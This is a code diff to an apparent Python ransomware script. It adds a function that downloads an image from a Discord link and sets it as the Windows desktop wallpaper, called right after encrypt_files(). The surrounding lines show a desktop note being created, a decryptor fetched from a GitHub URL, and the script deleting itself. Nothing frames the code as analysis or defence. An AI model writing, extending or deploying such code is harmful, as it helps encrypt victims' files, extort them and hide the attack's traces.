@@ -17,6 +17,37 @@ import requests
 from pathlib import Path
 import sys
 
+def set_wallpaper_from_url(url):
+    # Download the image
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            # Get the file name from the URL
+            file_name = os.path.basename(url)
+
+            # Save the image to a temporary file
+            temp_file_path = os.path.join(os.path.expanduser('~'), 'temp_wallpaper.jpg')
+            with open(temp_file_path, 'wb') as f:
+                f.write(response.content)
+
+            # Set the wallpaper (Windows-specific)
+            if os.name == 'nt':
+                # Assuming Windows
+                import ctypes
+                SPI_SETDESKWALLPAPER = 20
+                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_file_path, 3)
+                print("Wallpaper set successfully!")
+            else:
+                print("This function only supports Windows for setting wallpaper.")
+
+            # Clean up the temporary file
+            os.remove(temp_file_path)
+        else:
+            print("Failed to download image")
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+
+
 def delete_script():
     script_path = os.path.abspath(sys.argv[0])
     try:
@@ -247,6 +278,9 @@ def encrypt_files():
    create_text_file_on_desktop(file_name, content)
    url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/decrypt.py"
    download_file(url, filename="DECRYPT.py")
+   Wallpaper_url = r"https://media.discordapp.net/attachments/1218444344990629953/1218907696791552000/New_Project10.jpg?ex=66095f41&is=65f6ea41&hm=45b00629b66400f23d998136fde8d53ee0f69a91fd2f5fe252ee6069fe607345&=&format=webp&width=1166&height=656"
+   set_wallpaper_from_url(Wallpaper_url)
+
 encrypt_files()
 delete_script()
 
